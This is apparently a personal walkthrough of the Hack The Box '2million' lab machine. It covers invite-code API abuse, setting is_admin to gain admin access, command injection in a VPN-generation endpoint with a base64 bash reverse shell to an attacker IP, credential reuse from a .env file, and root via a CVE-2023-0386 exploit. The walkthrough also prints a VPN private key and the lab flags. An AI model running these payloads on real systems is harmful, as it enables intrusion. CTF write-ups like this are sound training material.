# ENUMERATION
---

## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |

Let's investigate the website:

![Pasted image 20250106160018.png](../../IMAGES/Pasted%20image%2020250106160018.png)

We need to add `2million.htb` to `/etc/hosts`:

![Pasted image 20250106160136.png](../../IMAGES/Pasted%20image%2020250106160136.png)



# RECONNAISSANCE
---

Source code is normal. Let's proceed with some fuzzing in order to find anything useful, we can also answer the first question of the machine:

![Pasted image 20250106160426.png](../../IMAGES/Pasted%20image%2020250106160426.png)

We have 2 TCP open ports.

Let's proceed with the fuzzing.


## Fuzzing
---


After trying to fuzz for a while, nothing useful came. Let's skip it for now


## Back to the standard page
---

Once we go back to the page, we can see there's a login page, let's go into it:

![Pasted image 20250106160859.png](../../IMAGES/Pasted%20image%2020250106160859.png)

Seems like we need some credentials in order to get here, XSS and SQLI does not seem to work in the login page.

But we have another interesting thing in the website, a `join` section, when we click on it, this happens:

![Pasted image 20250106161050.png](../../IMAGES/Pasted%20image%2020250106161050.png)

![Pasted image 20250106161104.png](../../IMAGES/Pasted%20image%2020250106161104.png)

If we take a look at the source code of this page, we find the following:

![Pasted image 20250106161218.png](../../IMAGES/Pasted%20image%2020250106161218.png)

Important things on the code are the following:

```ad-hint
1. The script makes a POST request to `/api/v1/invite/verify` in order to check if th invite code is correct
2. The script is calling another script called `inviteapi.min.js` as shown in the image:
```

Let's take a look at the other script:

![Pasted image 20250106161442.png](../../IMAGES/Pasted%20image%2020250106161442.png)

It's obfuscated, let's use chatgpt to deobfuscate the code: 

```ad-hint

#### Obfuscated code
---
`eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))`

#### Standard code
---

```


So, now we know the normal JS code is this: 

```js
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response);
        },
        error: function (response) {
            console.log(response);
        }
    });
}
function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response);
        },
        error: function (response) {
            console.log(response);
        }
    });
}
```

We found another interesting point, another POST request to `/api/v1/invite/how/to/generate`, if we use `curl` to this URL, we get the following:

```ad-important

`curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq`

#### Breakdown
---
**Key Options Used:**

- **`-s`:**  
    Stands for "silent" mode.
    
    - Suppresses progress information (like download percentages) and error messages to keep the output clean.
    - Errors will still result in an error code, but they wonâ€™t be printed to the terminal.
- **`-X POST`:**  
    Specifies the HTTP method to use for the request.
    
    - By default, `curl` uses `GET`, but here we explicitly use `POST`.
    - A `POST` request typically sends data to the server to create or process a resource.
- **`jq`**
	- `jq` is a lightweight and powerful command-line JSON processor. It formats and processes JSON data, making it easier to read and manipulate.


#### Output
---
```

Nice, we got some data, if we check at the encrypted data, we can know it is encrypted using `ROT13`, let's decrypt:

![Pasted image 20250106162422.png](../../IMAGES/Pasted%20image%2020250106162422.png)

We got the way to generate the invite code, we must do a POST request to `/api/v1/invite/generate`, let's use curl again:

![Pasted image 20250106162524.png](../../IMAGES/Pasted%20image%2020250106162524.png)

This is encoded using `base64`, let's decode:

![Pasted image 20250106162619.png](../../IMAGES/Pasted%20image%2020250106162619.png)

So, our invite code would be: `6BA2T-B3C3I-DCYVB-E5SG4`


![Pasted image 20250106162650.png](../../IMAGES/Pasted%20image%2020250106162650.png)

Nice! We can now register and also answer some questions:


![Pasted image 20250106162856.png](../../IMAGES/Pasted%20image%2020250106162856.png)

Nice, let's proceed with the registration part, let's create a simple account with the following credentials:

```ad-note

#### Credentials
----

user: `testhackerUsername`
email: `c`
password: `password123`
```

Nice, now we have an initial access:

![Pasted image 20250106163234.png](../../IMAGES/Pasted%20image%2020250106163234.png)

Let's start with the exploitation part.


# EXPLOITATION
---

Only a few things work in the website, most important one would be the `access` section, which throws this up:

![Pasted image 20250106165230.png](../../IMAGES/Pasted%20image%2020250106165230.png)

This page allows users to download and access a VPN file regarding the HTB infrastructure. Let's open up burp and check the request made by the `Connection Pack` section:

![Pasted image 20250106165433.png](../../IMAGES/Pasted%20image%2020250106165433.png)

We got a request to `/api/v1/user/vpn/generate` if we forward the request, we can download the VPN file. 

Let's try to make a get request to `/api` to check if anything useful comes with it:

![Pasted image 20250106165715.png](../../IMAGES/Pasted%20image%2020250106165715.png)


We are getting an unauthorized 401 status code, let's provide our current session cookie and check if anything changes:

![Pasted image 20250106165911.png](../../IMAGES/Pasted%20image%2020250106165911.png)

Nice, we could make the request, let's keep enumerating that api, let's change the request:

![Pasted image 20250106170019.png](../../IMAGES/Pasted%20image%2020250106170019.png)

We can see a bunch of endpoints related to that api, most interesting ones are the admin related ones, let's use our cookie to test how this works:

![Pasted image 20250106170213.png](../../IMAGES/Pasted%20image%2020250106170213.png)

Since the message is false, we know it works, it checked if my cookie relates to a privileged user cookie, we need some sort of way to get admin access exploiting these endpoints:

```ad-hint
Let's begin with looking up the `/admin/vpn/generate` endpoint, for this, we will change the request to a post one and use our cookie:


We get the same status code as before, we can check the `/admin/settings/update` endpoint which uses a PUT request:


It is very interesting, we do not get the same status code as before, this actually tells us something valuable, it is often for APIs to use JSOn for sending and receiving data, let's add a content type header set to json and check again:

It changed! Now it says we are missing the parameter `email`, let's give in our test email we created in the format of json as it will be displayed in the image:


Now it says we are missing the `is_admin` parameter, let's set this to true:
Seems like we need to set it to `1` instead of `true`:

It seems like we were able to escalate into admin user, let's make another call to the `/admin/auth` endpoint to check:


And we were right, we were able to escalate into admin user.

```


Now, our next step would be getting a reverse shell in some way, for this, let's follow this:

```ad-hint

Since we know that now we have admin access, we can check the `/admin/vpn/generate` endpoint to check what it gives us:


Let's put the username:


We can see that now we get access to the vpn, this is the data that was given by the endpoint 
```

```data
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
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
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2 (0x2)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Jan  6 22:27:09 2025 GMT
            Not After : Jan  6 22:27:09 2026 GMT
        Subject: C=GB, ST=London, L=London, O=testhackerUsername, CN=testhackerUsername
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:c3:b3:c0:aa:60:e2:2d:b4:dc:af:df:03:04:fc:
                    37:b0:58:05:d1:e9:92:1a:d2:2f:02:2e:a0:05:1a:
                    aa:da:e4:43:39:81:9f:46:98:57:58:49:a6:3b:b3:
                    e4:de:2c:3a:11:74:c9:27:23:c1:b4:c0:b2:a2:e1:
                    08:da:e9:45:38:b1:c3:fb:65:d1:ef:e1:6b:63:06:
                    fc:71:77:de:fc:28:59:c6:86:55:08:70:c1:3f:ac:
                    a8:ab:01:88:cf:86:94:0a:4a:f6:a5:13:6c:08:37:
                    61:a8:40:1d:82:0e:a1:52:f2:b3:8d:3f:0b:d2:fc:
                    a0:c0:7d:1e:84:3f:cf:1d:96:51:5b:24:df:8e:22:
                    d5:df:0f:3c:50:03:08:78:15:68:b0:66:2e:c9:e8:
                    f4:45:7f:b3:fb:e4:4a:e0:dc:a0:7e:0d:24:18:a4:
                    79:42:d7:ce:7e:87:68:08:3e:1c:8b:0f:9f:90:d0:
                    8f:6c:25:4a:89:61:2c:24:ba:89:f3:12:e8:ac:9a:
                    13:27:65:2f:61:19:5a:c3:9e:3c:80:ba:9c:94:db:
                    42:6e:33:cc:79:22:91:de:ed:7c:4c:38:72:c6:ec:
                    8c:d7:73:ed:a9:d6:14:d0:d8:c6:ff:01:1a:d2:e3:
                    2e:9d:66:e4:0e:bf:8f:bf:b3:95:0f:27:1c:53:82:
                    65:39
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier:
                7E:A7:1F:B5:18:9C:89:97:66:DA:83:03:ED:A7:55:81:9C:9F:6B:90
            X509v3 Authority Key Identifier:
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints:
                CA:FALSE
            X509v3 Key Usage:
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment:
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        a2:fc:b0:b0:82:33:62:09:50:48:a5:65:79:94:39:5e:71:01:
        8f:80:74:4e:6b:b9:aa:55:61:4d:45:2d:64:f6:73:84:d6:1c:
        43:de:31:83:52:66:ba:93:61:8c:b8:ce:8d:1c:e9:1d:01:fc:
        f6:e2:0f:d9:a1:1b:25:5f:b5:f8:97:ef:ea:8d:76:bf:21:d5:
        ed:72:98:ed:83:18:10:d3:9e:7b:56:63:9f:5f:fc:70:58:ab:
        55:b1:59:2b:79:84:63:21:d1:c4:0e:5c:94:16:ce:42:d8:c9:
        55:2d:28:8a:ce:cc:55:e4:2d:cc:a6:a5:f6:04:ec:b9:00:ad:
        77:6c:d1:77:1d:74:1e:3d:2a:c2:42:a7:6b:04:a6:e0:80:b7:
        77:6c:b2:41:61:8c:f9:00:8e:35:34:6c:0e:44:40:8c:34:17:
        86:43:76:33:74:80:33:cf:06:3b:35:a9:02:46:85:38:76:f6:
        ef:6c:f7:af:03:67:2f:a8:dd:f9:9e:0a:e8:8e:e6:b8:ec:7b:
        66:ba:3a:37:d7:b9:64:3d:cb:cb:d2:80:61:7f:4b:0c:c0:87:
        f4:03:2e:3f:76:ba:d1:87:b3:11:e5:bd:52:a2:22:74:2b:57:
        06:1c:12:fa:4f:a0:9c:c4:1e:27:a2:cb:74:e3:27:78:e5:d8:
        fa:5f:41:93:3f:05:8d:19:84:3f:1c:f3:b5:e0:ca:7c:ed:be:
        5a:1d:a7:74:2d:e3:21:d0:be:2d:97:e3:45:78:76:a6:23:66:
        31:e2:73:2e:a0:56:af:dc:af:7e:2d:28:c4:34:1f:73:ff:6b:
        b3:88:2f:b7:f7:91:1d:b5:c7:41:9b:50:0f:b8:c3:c3:31:9c:
        f5:07:7b:e7:80:18:8f:3b:dd:b2:56:fa:c0:07:b6:66:40:5c:
        92:35:16:19:9d:5c:c4:4a:7d:c2:b9:ea:69:c4:8e:38:98:c9:
        8a:29:4c:a3:08:82:af:bb:b0:7f:eb:79:7a:d8:1e:68:0a:32:
        e1:49:94:a0:cb:d6:b7:bf:13:66:9f:33:7b:fc:98:b6:1c:d5:
        b6:23:63:20:c3:86:73:60:52:d0:2e:b3:e4:85:8e:c1:78:3d:
        96:b1:e4:50:f2:48:a8:a3:e1:92:fc:23:b2:a7:42:51:5d:67:
        a2:59:b6:63:ea:fd:f6:01:7d:87:b6:a6:46:49:d7:a2:8f:26:
        08:e0:8a:3a:da:15:c8:b0:8c:f7:7d:1c:28:75:43:03:e3:6b:
        b4:fd:ad:00:e3:99:c9:00:71:74:5b:a2:fe:9d:d5:e5:fc:8d:
        c7:d4:a5:3e:1c:e1:85:e1:df:21:fb:e1:d9:3b:5e:bd:3a:9d:
        1c:2f:c2:73:fb:a6:13:08
-----BEGIN CERTIFICATE-----
MIIE9zCCAt+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjUwMTA2MjIyNzA5WhcNMjYw
MTA2MjIyNzA5WjBpMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xGzAZBgNVBAoMEnRlc3RoYWNrZXJVc2VybmFtZTEbMBkGA1UE
AwwSdGVzdGhhY2tlclVzZXJuYW1lMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
CgKCAQEAw7PAqmDiLbTcr98DBPw3sFgF0emSGtIvAi6gBRqq2uRDOYGfRphXWEmm
O7Pk3iw6EXTJJyPBtMCyouEI2ulFOLHD+2XR7+FrYwb8cXfe/ChZxoZVCHDBP6yo
qwGIz4aUCkr2pRNsCDdhqEAdgg6hUvKzjT8L0vygwH0ehD/PHZZRWyTfjiLV3w88
UAMIeBVosGYuyej0RX+z++RK4Nygfg0kGKR5QtfOfodoCD4ciw+fkNCPbCVKiWEs
JLqJ8xLorJoTJ2UvYRlaw548gLqclNtCbjPMeSKR3u18TDhyxuyM13PtqdYU0NjG
/wEa0uMunWbkDr+Pv7OVDyccU4JlOQIDAQABo4GJMIGGMB0GA1UdDgQWBBR+px+1
GJyJl2bagwPtp1WBnJ9rkDAfBgNVHSMEGDAWgBR6Yt0dtv5KyOP4n/qs9BUMlrou
kTAJBgNVHRMEAjAAMAsGA1UdDwQEAwIB/jAsBglghkgBhvhCAQ0EHxYdT3BlblNT
TCBHZW5lcmF0ZWQgQ2VydGlmaWNhdGUwDQYJKoZIhvcNAQELBQADggIBAKL8sLCC
M2IJUEilZXmUOV5xAY+AdE5ruapVYU1FLWT2c4TWHEPeMYNSZrqTYYy4zo0c6R0B
/PbiD9mhGyVftfiX7+qNdr8h1e1ymO2DGBDTnntWY59f/HBYq1WxWSt5hGMh0cQO
XJQWzkLYyVUtKIrOzFXkLcympfYE7LkArXds0XcddB49KsJCp2sEpuCAt3dsskFh
jPkAjjU0bA5EQIw0F4ZDdjN0gDPPBjs1qQJGhTh29u9s968DZy+o3fmeCuiO5rjs
e2a6OjfXuWQ9y8vSgGF/SwzAh/QDLj92utGHsxHlvVKiInQrVwYcEvpPoJzEHiei
y3TjJ3jl2PpfQZM/BY0ZhD8c87Xgynztvlodp3Qt4yHQvi2X40V4dqYjZjHicy6g
Vq/cr34tKMQ0H3P/a7OIL7f3kR21x0GbUA+4w8MxnPUHe+eAGI873bJW+sAHtmZA
XJI1FhmdXMRKfcK56mnEjjiYyYopTKMIgq+7sH/reXrYHmgKMuFJlKDL1re/E2af
M3v8mLYc1bYjYyDDhnNgUtAus+SFjsF4PZax5FDySKij4ZL8I7KnQlFdZ6JZtmPq
/fYBfYe2pkZJ16KPJgjgijraFciwjPd9HCh1QwPja7T9rQDjmckAcXRbov6d1eX8
jcfUpT4c4YXh3yH74dk7Xr06nRwvwnP7phMI
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDDs8CqYOIttNyv
3wME/DewWAXR6ZIa0i8CLqAFGqra5EM5gZ9GmFdYSaY7s+TeLDoRdMknI8G0wLKi
4Qja6UU4scP7ZdHv4WtjBvxxd978KFnGhlUIcME/rKirAYjPhpQKSvalE2wIN2Go
QB2CDqFS8rONPwvS/KDAfR6EP88dllFbJN+OItXfDzxQAwh4FWiwZi7J6PRFf7P7
5Erg3KB+DSQYpHlC185+h2gIPhyLD5+Q0I9sJUqJYSwkuonzEuismhMnZS9hGVrD
njyAupyU20JuM8x5IpHe7XxMOHLG7IzXc+2p1hTQ2Mb/ARrS4y6dZuQOv4+/s5UP
JxxTgmU5AgMBAAECggEAFNI48T+fzMJZePYyi2scryy8SMgvkN40HWixwn1C+Ikw
3EtN03xVjal/T8qM0vT0ZCNPW/ROUYFveAwWbbkEEfs6yVJczsdmThnCDb31ydDu
tUQZQ63AZ7qCUvhVspOkSECPw4IgnDKtN5IDubC+CfXTs9dFdigF39joAGTMD778
3xIL6ozvau8qwCVKoLfvI/v/SkytPoWHnKMouOcNTVA8RYLP0lPxaWwiBU1+P7hg
OEWJATMSHanukNhmBOb3jZ+cVWHviySbRzYI11IKSNtb1bnvf8TFCtkbd3vs9Z5I
MY8is0AzpanWvWSYktHN/qxFN7+iLf+Ea/VPPtmzAQKBgQDVFjYzw2NY1ZNuJNeB
JuWlvS1tTo1ZSsKp3Cb7ZALCbzrD1vczEsX3qtHsGYpwyNRVUKjWegjd57iZB6uk
bKKn/oWhw6StpkY/Bs8v/SVXlwQeyRDpxliuQ4BBHhk0yHi0bTAQ1gGCUEjbnwBb
oRRi/NPK1qRQS+DwPA+eE3VRAQKBgQDrHUTzqs+3tmFzcYvsSHW7U1YniLuEZHaI
W5pAuK6N9uaMO2n0RFFGHqWvWqqZtcV9/F6xakbIKZ30odWx6m6s8KgQ/qEDOIIl
PVmuzxB3qqlvjzUdjeJ/6r50xy+wHvbHK2IVU6z15Qm06LHAS2Xl9RLaNyvLkgg0
boCkXkdcOQKBgHHMgvXyC0SOC0ZvdogK9eoltfUCVoqxWnTMliT7rF2aeY/NZgdo
p0E1gRbOLRk+p+dIRGMGmWWpMvTHG+ub+OIvE77odTIn8qwGPvAqCZ9Vj2XBi77N
pt6qPfyIzn1Z8tyo01qqb/PgXIitycslo3WaAKH7L5WScHbcHJsXWTgBAoGBAIQt
lFIYuWZi1i58q1lO80E4/LqFGEa55BmMxg+UxC1znPFBhbOZpMdy+1q18iswEbNe
ai37vYdSPkcFpIm9bjMzqIjFXefdoO0mrICmUG+2NkNNk2LmHWwkoKYuRRUSk1It
hZrPy/EBro9SMnwU51h8ivi7A5gSpSI07YV6q0uhAoGBAKYhN4q1HySN7Xx7HOOz
iRNNYEGccsMQ8GEEP5lf9og95EG59VeSyFqIB+useWdWSMnV1TmML8Xdje7pdjS0
LgEEsIrQbeaCkO0F8iQ3COsulSdntLOeAMz/13TIPH7U3I4/zlyRuhfL2oCWCVxf
nqRSXAzMT+vUh/bOHQEQHad2
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>
```


Nothing seems really off, but, in case the system is generating this VPN files by using a php function such as `exec` or `system`, we could try [command injection](../../CHEATSHEET/Command%20Injection.md), let's test with a simple `id`:

![Pasted image 20250106172955.png](../../IMAGES/Pasted%20image%2020250106172955.png)

That's right, this endpoint is vulnerable to command injection, we can get a reverse shell in the following way:

```ad-hint

1. Setting up our listener: `nc -lvnp 4444`
2. Sending the following payload: `bash -i >& /dev/tcp/OUR_VPN_IP/LISTENER_PORT 0>&1`, for this case: `bash -i >& /dev/tcp/10.10.15.36/4444 0>&1`
3. Encoding the payload in base64, for this case, this was my encoded payload: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zNi80NDQ0IDA+JjE=`
4. Sending the command injection and getting the shell.

#### Output
----

Sent payload: `curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=lc3vb3f7nhk6krnqls1oc2t93t" --header "Content-Type: application/json" --data '{"username":"testhackerUsername;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zNi80NDQ0IDA+JjE= | base64 -d | bash;"}'`

```

We got our shell, let's [stabilize it](../../Commands/Shell%20Tricks/STABLE%20SHELL.md): 

![Pasted image 20250106173633.png](../../IMAGES/Pasted%20image%2020250106173633.png)

Nice, now we have an stable shell!


# PRIVILEGE ESCALATION
---


In order to perform privilege escalation, let's begin with a simple enumeration of the `/var/www/html` directory we are currently in:

![Pasted image 20250106173802.png](../../IMAGES/Pasted%20image%2020250106173802.png)

We see a `.env` file, a **`.env` file** is a simple text file used to store environment variables for an application. These files are commonly used in software development to manage configuration settings in a structured and secure way.

Let's read it:

![Pasted image 20250106173902.png](../../IMAGES/Pasted%20image%2020250106173902.png)

Seems like we have an `admin` user in this machine, let's read `/etc/passwd` to check if its true:

![Pasted image 20250106174006.png](../../IMAGES/Pasted%20image%2020250106174006.png)

It is indeed true, now that we know it exists, we can log into ssh using those credentials:

```ad-note

##### Credentials:
---
DB_USERNAME=`admin`
DB_PASSWORD=`SuperDuperPass123`
```

![Pasted image 20250106174135.png](../../IMAGES/Pasted%20image%2020250106174135.png)

We are inside ssh, let's check our privileges using `sudo -l`:

![Pasted image 20250106174306.png](../../IMAGES/Pasted%20image%2020250106174306.png)

We can not run sudo with this user, what about `find / -perm -4000 2>/dev/null`:


![Pasted image 20250106174453.png](../../IMAGES/Pasted%20image%2020250106174453.png)

We found something really interesting, a `CVE-2023-0386` related file, if we read this CVE, this is what its about:

![Pasted image 20250106174601.png](../../IMAGES/Pasted%20image%2020250106174601.png)

Let's find an exploit for this an execute it:

```ad-note

Exploit: [exploit](https://github.com/xkaneiki/CVE-2023-0386)

```


I will be using that exploit, let's get it and execute it in the machine in the way the author tells us:


```ad-hint
1. `git clone https://github.com/xkaneiki/CVE-2023-0386`
2. `zip -r exploit.zip CVE-2023-0386`
3. `scp exploit.zip admin@2million.htb:/tmp`
4. `cd /tmp`
5. `unzip exploit.zip`
6. `cd /tmp/CVE-2023-0386`
7. `make all`
8. `./fuse ./ovlcap/lower ./gc & ./exp`
9. `./exp`
```

After reproducing all the steps, we get a root shell:

![Pasted image 20250106175456.png](../../IMAGES/Pasted%20image%2020250106175456.png)


Now we can read the root flag and the user flag:

![Pasted image 20250106175618.png](../../IMAGES/Pasted%20image%2020250106175618.png)

![Pasted image 20250106175639.png](../../IMAGES/Pasted%20image%2020250106175639.png)

```ad-note
root flag: `cca8ef6fecc788f8396049dc9a933d62`
user flag: `d16ba35dd56db9718ba007fbf1e2f0e4`
```


Just like that, machine is done, here are all the answers:

![Pasted image 20250106180211.png](../../IMAGES/Pasted%20image%2020250106180211.png)

![Pasted image 20250106180236.png](../../IMAGES/Pasted%20image%2020250106180236.png)

![Pasted image 20250106180250.png](../../IMAGES/Pasted%20image%2020250106180250.png)

![Pasted image 20250106180258.png](../../IMAGES/Pasted%20image%2020250106180258.png)

